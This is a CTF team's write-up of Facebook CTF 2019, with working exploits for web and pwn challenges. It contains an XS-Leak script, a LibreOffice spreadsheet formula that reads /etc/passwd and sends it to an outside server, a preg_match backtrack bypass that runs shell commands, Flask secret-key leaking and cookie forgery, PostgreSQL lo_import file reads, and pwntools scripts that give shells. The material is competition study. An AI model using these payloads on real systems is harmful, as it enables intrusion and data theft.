# Facebook CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190603-facebookctf/) of this writeup.**


 - [Facebook CTF 2019](#facebook-ctf-2019)
   - [Web](#web)
     - [Product Manager](#product-manager)
     - [Secret Note Keeper](#secret-note-keeper)
       - [Problem Analysis](#problem-analysis)
       - [Exploit](#exploit)
     - [pdfme](#pdfme)
     - [rceservice](#rceservice)
     - [events](#events)
     - [hr_admin_module](#hr_admin_module)
   - [Crypto](#crypto)
     - [postquantum](#postquantum)
   - [Misc](#misc)
   - [Reverse](#reverse)
     - [nomoreseacrypt](#nomoreseacrypt)
   - [Pwn](#pwn)
     - [otp_server](#otp_server)
     - [rank](#rank)
     - [rust_shop](#rust_shop)
     - [raddest_db](#raddest_db)


## Web

### Product Manager

We're given the php source code: `add.php`, `db.php`, `footer.php`, `header.php`, `index.php`,  `view.php`.

And there are some simple MySQL instructions in it, but all sql statements prepared well.

In the `db.php`, it shows us the table structure:

```sql
CREATE TABLE products (
  name char(64),
  secret char(64),
  description varchar(250)
);

INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
```

We should login as `facebook` to get the flag in the database.

But we can't SQL Injection and we don't have the password of the user `facebook`.

Since that data type of `name` column in the table `products` is `char(64)`, so maybe we can try MySQL Truncation vulnerability to insert a different `facebook` user.

In non-strict mode, if we insert a very long value to `varchar` or `char`, it will cause the result to be truncated.

(In August 2008, Stefan Esser put forward the SQL column truncation attack)

Exploit:

1. Register (Note: the `_` is ` `(Space))
    - username: ```facebook________________________________________________________kaibro```
    - password: `ka1bro8!gGG`
2. It will truncate the username and then store the username `facebook` with password `ka1bro8!gGG` into database.

3. Login with username `facebook` and password `ka1bro8!gGG` at `view.php`
4. get the flag!

![](https://github.com/w181496/CTF/raw/master/fbctf2019/ProductsManager/pm.png)

flag: `fb{4774ck1n9_5q1_w17h0u7_1nj3c710n_15_4m421n9_:)}`

### Secret Note Keeper


#### Problem Analysis
- This challenge looks same as 35C3 CTF filemanager:
    - Register / Login / Logout
    - Add note
    - Search Note
    - Report bug
    
- Let's try to report my domain and view the request:
    - `HeadlessChrome/74.0.3729.169 Safari/537.36`
    - [Chrome 74](https://portswigger.net/daily-swig/google-chromes-xss-auditor-goes-back-to-filter-mode), it seems like we can't use XSS Auditor to leak data. Because it goes back to filter mode from block mode.
- After fuzzing, we found two special characters:
    - `_` will match any single character
    - `%` will match many characters
    - we can use this feature to get the length of the flag
- In `Search note`, if it found any note, it will use `iframe` to import the corresponding note to the page.

#### Exploit

- Obviously, this is a XS-Leak challenge
- We can use frame count (`contentWindow.length`) to identify whether it found the notes or not
    - found => `frame count >= 1`
    - not found => `frame count = 0`

- Write a script to bruteforce it:

```python
import requests
import hashlib
import re

def POW(target):
    mx = 10 ** 8
    nonce = 0
    while nonce < mx:
        s = str(nonce)
        res = hashlib.md5(s).hexdigest()
        if res.startswith(target):
            print(res)
            return s
        nonce += 1

alphabet = "!-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

for i in alphabet:

    cookie = {"session":"286b4d92-cf9d-5d8e-9da2-0d2ce4617ac3", "session":".eJwljgkOwzAMBP_C5oUOkiL2mUA8hKS14ySI32Mg2HJmgPBAYx15PmF_H5du8HgF7CdqXaVwJOG4qj0saBWt6qUPGegmprfD5u6JVKVRXblWbZ74PI16Yl9cR5_CLDciTxJyq3fVE9uMKbpKM13JEpjC3tpAD0jgOvP4n8HW4PsDAIIvzQ.XPJRVA.xJ6roM-pNGsVmS9dS0rJr_BoCpI;"}

    r = requests.get("http://challenges.fbctf.com:8082/report_bugs", cookies=cookie)

    x = re.findall("proof of work for (.*) \(", r.text)
    print(x[0])

    ans = POW(x[0])
    print "ans:" + ans

    r2 = requests.post("http://challenges.fbctf.com:8082/report_bugs", data={"link":"http://kaibro.tw/log.php?1="+i, "pow_sol":ans, "body":"","title":""}, cookies=r.cookies)
    print r2.text
```

And the `log.php` in above script is:

```php
<iframe src="http://challenges.fbctf.com:8082/search?query=fb{cr055_s173_l34<?php echo $_GET[1];?>%}" onload="if(this.contentWindow.length>=1){fetch('http://kaibro.tw/?fb=ok');}">
```

If we found the character, then we will receive the `ok` request message. Then we can try the next character. 

flag: `fb{cr055_s173_l34|<5_4r4_c00ool!!}`


### pdfme

This challenge is very similar to another challenge in DCTF final 2018.

But I didn't solve it when I participated in the DCTF, so this challenge still took me a lot of time.

First, we should find a valid `fods` file. And I use [this](https://github.com/BuffaloWill/oxml_xxe/blob/master/samples/sample.fods) from oxml_xxe repo.

(fods file is OpenDocument Flat XML spreadsheet format.)

We can try to use some libreoffice macro/function to read file or exfiltrate data.

There is a function `WEBSERVICE` that we can use it to read local file or send http request.

`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;)` => send http request to my server

`=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)` => read the local file `/etc/passwd`

Combine!

`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`

Then it will read the `/etc/passwd` file and send the content to our server like this:

![](https://i.imgur.com/NXCbuuF.png)

So we have an arbitrary file read vulnerability now.

But the flag is not in the root directory, we should find the path of the flag first.

After fuzzing, I found there is a weird user `libreoffice_admin` from `/etc/passwd`.

So when I tried to read `/home/libreoffice_admin/flag`, it send the real flag to my server!

`[01/Jun/2019:22:05:06 +0000] "OPTIONS /xfb%7Bwh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful%7D%0A HTTP/1.1" 200 193 "-" "LibreOffice"`

flag: `fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}`

payload: [flag.fods](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)


### rceservice

This challenge is very short:

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

It uses `preg_match()` to block a lot of patterns.

But we know that PHP has `pcre.backtrack_limit`, and the value of it is `1000000` by default.

When the regex matching backtrack more than `1000000` times, the `preg_match` will return `false` directly.

(Detail: https://www.php.net/manual/en/pcre.configuration.php)

![](https://github.com/w181496/CTF/raw/master/fbctf2019/rceservice/pcre.png)

([regex101](https://regex101.com) is your good friend)

You can test this special feature on your php console:

```
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1000000)));
bool(false)
php > var_dump(preg_match("/union.+select/is", "union select /*".str_repeat("s", 1)));
int(1)
```

So if the number of backtracking times exceeds the limit, the `preg_match` will return `false` and then bypass the `if` check.

Exploit script:

```python
import requests

payload = '{"cmd":"ls /","zz":"' + "a"*(1000000) + '"}'

r = requests.post("http://challenges.fbctf.com:8085/", data={"cmd":payload})
print r.text
```


e.g.

`'{"cmd":"ls -al /home/rceservice/","zz":"' + "a"*(1000000) + '"}'`

=>

```
drwxr-xr-x 1 root root       4096 May 26 21:20 ..
-r--r--r-- 1 root rceservice   43 May 23 03:58 flag
dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
```

Bypass successfully!

Now, let's read flag:

`'{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'`

=> `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`


### events

This challenge has some basic functions: register/login, added events(Name or Address), Admin Panel.

Our goal is to login as admin to view the admin panel.

In the beginning, we tried to decrypt the `user` cookie.

The cookie consists of three parts: data, timestamp, signature.

e.g. `Inp4YyI.XPZfEQ.Mr7NJDYuYIF6sf87wTcKCYuBBVc`.

We can use the following script to decrypt data and timestamp:

```python
from itsdangerous import base64_decode

s = "ImFzZCI.XPVouA.bToZpDkYXf5CMWcolC-CWgdaDdU"
data, timestamp,secret = s.split('.')

print(base64_decode(data))
print(int.from_bytes(base64_decode(timestamp),byteorder='big'))
```

But we don't have any secret key, so we can't sign the cookie.

Then I found that someone use username:`asd` and password:`asd` to try some python format string attack:

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/asd.png)

When I refreshed this page, the addresses of the result changed too.

So I know there is a format string vulnerability in the added event function! Thank you `asd:asd`.

After fuzzing, I found the vulnerability is in the `event_important` argument:

`event_name=a&event_address=a&event_important=__dict__`

The response of this payload is: 

`{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7fb2c5ba2588>, 'fmt': '{0.__dict__}', 'show': '__dict__', 'name': 'a', 'owner_id': 67, 'address': 'a', 'id': 5335}`

OK. Let's try to find some useful information.

After that, I found the config of this flask app:

`event_important=__class__.__init__.__globals__[app].config`

=>

`
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'events_sesh_cookie', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///my.db', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
`

It contains the secret key: `'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'`

We use `flask-unsign` to sign flask cookie.

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/colab.png)

`flask-unsign --secret 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y' --sign --cookie "admin"`

=> `ImFkbWluIg.XPSrLA.NdkV5Vsk-a5gDFlll1JcU2SumDI`

Replace the `user` cookie with this value, and then get the flag!

![](https://github.com/w181496/CTF/raw/master/fbctf2019/events/admin.png)

flag: `fb{e@t_aLL_th0s3_c0oKie5}`


### hr_admin_module

This challenge tells us that there are some secrets in the `/var/lib/postgresql/data/secret`, but the current user doesn't have sufficient permissions to access it.

(This path tells us that backend DBMS is `postgresql`.)

There is a weird disabled function `Search users`, but we can still send the request with the parameter `user_search`.

If my input is invalid SQL statement, it will show the warning message on the next request.

e.g. 

- warning: `admin'`, `'''`, `'kaibro_30_cm`, ...
- no warning: `admin'--`, `''`, `'||'kaibro_30_cm`, ...

This is an obvious SQL Injection vulnerability.

And this chellenge seems like to restrict the permissions of some functions, e.g. `pg_sleep()`, `pg_read_file()`, ...

But I found that `repeat()` function will cause time delay!

e.g. `'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a', 10000000)) else NULL end)--`

Now, we have Time-based SQL Injection!

My injection script is [here](https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py).

Let's dump some basic information:

```
version: (Debian 11.2-1.pgdg90+1)
current_db: docker_db
current_schema: public
table of public: searches
columns of searches: id,search
current_query: SELECT * FROM searches WHERE search = 'YOUR_INPUT'
```

Nothing special :(

The table `searches` seems empty and we don't have permissions to use any system administration functions like `pg_read_file()`, `pg_ls_dir()` or `pg_stat_file()`.

But the path of secret looks like postgresql default data directory.

This means we should read file by some special file functions.

So I guess there are some special functions with wrong permissions that can be used to read the secret file.

I browsed the postgres documentation and postgres src the whole day, but nothing special.

At last, I build a local postgresql environment and try to find all functions that contain the `file` in the function name:

`SELECT proname FROM pg_proc WHERE proname like '%file%';`

=>

```
 pg_stat_get_db_temp_files
 pg_walfile_name_offset
 pg_walfile_name
 pg_rotate_logfile_old
 pg_read_file_old
 pg_read_file
 pg_read_binary_file
 pg_stat_file
 pg_relation_filenode
 pg_filenode_relation
 pg_relation_filepath
 pg_show_all_file_settings
 pg_hba_file_rules
 pg_rotate_logfile
 pg_current_logfile
```

But these functions are all useless.

After that, I tried to find all functions with `read` in the function name:

`SELECT proname FROM pg_proc WHERE proname like '%read%';`

=>

```
 loread
 pg_stat_get_db_blk_read_time
 pg_read_file_old
 pg_read_file
 pg_read_binary_file
```

The first function looks so weird.

Then I found a series of this function: `lo_import`, `lo_open`, `lo_read`, ... in the [documentation](https://www.postgresql.org/docs/11/lo-funcs.html).

The `lo_import()` can load file into postgres object.

Let's try it: `lo_import('/var/lib/postgresql/data/secret')`.

=> return a number `18440`.

This number is the object id, and this means that secret file load into object successfully!

Now, we can use `lo_get(oid)` function to read the object content by the corresponding oid.

```
select cast(lo_import('/var/lib/postgresql/data/secret') as text)
=> 18440

select cast(lo_get(18440) as text)
=> \x66627b4040646e....
```


flag: `fb{@@dns_3xfil_f0r_the_w1n!!@@}`

(it looks like this is unintended solution :p)

## Crypto
### postquantum

## Misc
## Reverse
### nomoreseacrypt
Given a C++, static linked binary ( stripped ) and an encrypted file temp.bin, we were asked to recover the encrypted data.  

After spending some time reversing the binary, we figured out that:
* The username of the euid has to be "buildmaster"
* It will open a file "/home/buildmaster/src/charmony/lib/strangefinder/splinesreticulator.cpp", encrypt it and write it to temp.bin.
* The first line of the file should be "// Copyright 2019 - QwarkSoft"
* It will use the following pseudo code to encrypt the file:

```c
srandom(time(NULL));
set_random_string(rand_string, 32LL); // generate random string with random()
init_initbuf(initbuf); // initbuf's content is fixed
set_buf4(buf4, rand_string, xmmword_7BE140, initbuf); // write to buf4
encrypt(buf4, file_content, file_sz, initbuf); // write to file_content
```

`set_buf4()` will use `rand_string`, `xmmword_7BE140` ( a fixed 16 byte value ) and `initbuf` ( fixed content ) to generate `buf4`. Then in `encrypt()` it will use `buf4` and `initbuf` to encrypt file's content.

At first we didn't recognize the encryption algorithm and decided to re-implement the code in python and planning on brute-forcing the timestamp. Until **sces60107** told us that it looks like AES. Knowing the algorithm, we then just modified our script and brute-force the timestamp ( which is close to the timestamp of temp.bin ).

![](https://i.imgur.com/36oKyP4.png)


flag: `fb{RandumbNumbers}`


## Pwn

### otp_server
The return value of `snprintf(target, "%0x100s", src)` is the size of the source string which we want to copy.

Thus, we can simply leak the other values on the stack. e.g. libc, canary, etc.
Due to we can also leak the nonce read from `/dev/urandom`, we are able to write arbitrary bytes on the stack, trigger one_gadget and get shell.

Exploit:
```python
from pwn import *

#r = process('./otp_server')
r = remote('challenges3.fbctf.com', 1338)


def set_key(ctx):
    r.sendafter('>>>', '1')
    r.sendafter(':', ctx)


def encrypt(ctx):
    r.sendafter('>>>', '2')
    r.sendafter(':', ctx)


def get_nounce(gadget):
    for i in range(4, 7):
        print(i)
        while True:
            set_key('A'*0x11 + ('A'*(6-i)) + "\x00")
            encrypt('A'*0x100)
            r.recvline()
            r.recvline()
            r.recvn(0x108)
            r.recvn(9)
            r.recvn((8+(2-i)))
            nouce = u32(r.recvn(4))
            nouce = (nouce >> 24 ) & 0xff
            print('nouce', hex(nouce))
            if (nouce == (gadget>>(((6-i)*8)))&0xff):
                break


set_key('A'*0x30)
encrypt('A'*0x100)
r.recvline()
r.recvline()
r.recvn(0x108)
canary = u64(r.recvn(8))
base = u64(r.recvn(8)) - 0xdd0
libc = u64(r.recvn(8)) - 0x21b97

gadget = libc+0x4f322


print('gadget', hex(gadget))
print('canary', hex(canary))
print('base', hex(base))
print('libc', hex(libc))

get_nounce(gadget);

r.interactive()
```
flag: `fb{One_byte_aT_a_time}` 

### rank

Out-of-bound and ROP get the shell.

```python

#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'challenges.fbctf.com'
port = 1339

binary = "./r4nk"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def rank(t,rr):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil("> ")
  r.sendline(str(t))
  r.recvuntil("> ")
  r.sendline(str(rr))

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  rank(0,0x11)
  r.recvuntil("> ")
  r.sendline("1"+"\x00"*7 + p64(0x000602030))
  r.recvuntil("0. ")
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x110070
  print("libc = {}".format(hex(libc)))
  magic = libc + 0x4f322
  pop_rsp_1 = 0x0000000000400980

  rank(19,pop_rsp_1)
  rank(20,0x602100)
  r.recvuntil("> ")
  raw_input("@")
  r.sendline("3" + "\x00"*7 + p64(magic))
  r.interactive()
```

### rust_shop

Limbo found crash and probability to get the flag......

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'challenges.fbctf.com'
port = 1342

binary = "./rusty_shop"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def c(name,Description,Price):
  r.recvuntil("t\n")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(name)
  r.recvuntil(": ")
  r.sendline(str(Description))
  r.recvuntil(": ")
  r.sendline(str(Price))
  pass

def a(index,count):
  r.recvuntil("t\n")
  r.sendline("4")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(": ")
  r.sendline(str(count))
  pass


def show(index):
  r.recvuntil("t\n")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))

def check():
  r.recvuntil("t\n")
  r.sendline("6")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)
flag_ptr = 0x701e40
if __name__ == '__main__':
  c("AAAAAAAA" + p64(0x701e40),-1,-1)
  show(1)
  a(1,9223372036854775808)
  raw_input("@")
  check()

  r.interactive()
```
### raddest_db
The service allow us to create database and store/delete/get some key-value it in. It also has a "getter" feature which allow us to set and run a getter function while getting a key's value.  

The program is written is C++ and it's been heavily optimized, which make it pretty hard for us to reverse the binary. We ended up fuzzing the service manually and found a type confusion vulnerability:

```python
create("A") # create database "A"
store("A","string" , 2, "AAAAAAAAAAAAAAAAAAA")
store("A","int" , 2, -1)
print_db("A") # crash, invalid pointer 0xffffffffffffffff
```

The above payload will crash the program. After analyzing the crash, we found that the second value ( -1 ) will overwrite the string pointer of the first value. Later when it want to print out the value, it will treat `-1` as a char pointer, thus crashing the program.

With this vulnerability we can first leak the heap address, then create an arbitrary read primitive to leak libc's address:

```python
# leak heap
create("A") 
store("A","int" , 2, -1)
store("A","string" , 2, "AAAAAAAAAAAAAAAAAAA")
get("A",2) # print heap address as integer

# arbitrary read
store("A","string" , 1, "ZZZZZZZZZZZZZZZZZZZ")
# use float to control the address value
store("A","int" , 1, float_to_str(struct.unpack("<d",p64(address))[0]))) 
get("A",1) # leak arbitrary address
```

Now all we need to do is control the damn RIP. We spent a lot of time reversing and fuzzing the program, and finally got another crash:

```
create d0
getter d0 2 1
delete d0  <-- should be "delete d0 2" instead
```

We noticed that while setting the getter, the program has miscount the parameter number. For example while handling the `delete` command, it check if it has 2 parameters ( the command itself and db name ). But in fact it should have 3 parameters instead of 2 ( the command itself, the db name and the key ). So later when the program treat the 3rd argument ( which obviously is a NULL pointer since there is no 3rd argument ) as a string, it will crash the program. This is another vulnerability ( a logic bug ).

We found that there are many cases which the program has miscount the parameter number, and one of them is the `empty` command, which leads to UAF eventually. We use this to overwrite the vtable and hijack the control flow.

Final exploit:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
import struct
import decimal
host = 'challenges.fbctf.com'
port = 1337

binary = "./raddest_db"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def create(name):
  r.recvuntil(">>> ")
  r.sendline("create " + name)
  pass

def store(db,t,key,value):
  r.recvuntil(">>> ")
  r.sendline("store " + db + " " + t + " " + str(key) + " " + str(value))
  pass

def get(db,key):
  r.recvuntil(">>> ")
  r.sendline("get " + db + " " + str(key))
  pass

def destroy(db):
  r.recvuntil(">>> ")
  r.sendline("destroy " + db)
def li():
  r.recvuntil(">>> ")
  r.sendline("list databases")

def empty(db):
  r.recvuntil(">>> ")
  r.sendline("empty " + db)

def delete(db,key):
  r.recvuntil(">>> ")
  r.sendline("delete " + db + " " + str(key))

def pr(db):
  r.recvuntil(">>> ")
  r.sendline("print " + db)

def echo(data):
  r.recvuntil(">>> ")
  r.sendline("echo " + data)

def getter(db,key,ops=0):
  r.recvuntil(">>> ")
  r.sendline("getter " + db + " " + str(key) + " " + str(ops))

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

def float_to_str(f):
  ctx = decimal.Context()
  ctx.prec = 20
  d1 = ctx.create_decimal(repr(f))
  return format(d1, 'f')

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = remote("127.0.0.1" ,4444)
else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil(">>> ")
  r.recvuntil(">>> ")
  r.recvuntil(">>> ")
  create("D"*(0x410))
  destroy("D"*0x410)
    
  create("A")
  store("A","int" , 0, -1)
  store("A","string" , 0, "A"*19)
  get("A",0)
  heap = int(r.recvuntil("\n")[:-1]) - 0x13d80
  print("heap = {}".format(hex(heap)))
  store("A","string" , 1, "Z"*19)
  store("A","float" , 1, float_to_str(struct.unpack("<d",p64(heap + 0x12f90))[0]))
  get("A",1)
  libc = u64(r.recv(6).ljust(8,"\x00")) - 0x3ebca0
  print("libc = {}".format(hex(libc)))
  store("A","string" , 2, "Z"*19)
  r.sendlineafter(">>> ", "getter A 2 1")
  r.sendlineafter(": ", "empty")
  setcontext = libc + 0x520a5
  gets = libc+0x800b0
  create("X"*0x10 + p64(gets)[:-1])

  create("Y"*0x10 + p64(heap+0x13d70)[:-1])
  create("Z"*0x10 + p64(heap+0x13db0)[:-1])
  pr("A")
  raw_input("@")
  sh = libc + 0x1b1f01
  system = libc + 0x4f45b
  r.sendline(p64(heap+0x13db8) + p64(setcontext) + cyclic(88) + p64(sh) + "D"*48 + p64(heap+0x20000) + p64(system))
  r.sendline("ls")
  r.interactive()
```

flag: `fb{everything_has_side_3ffects_N0w}`

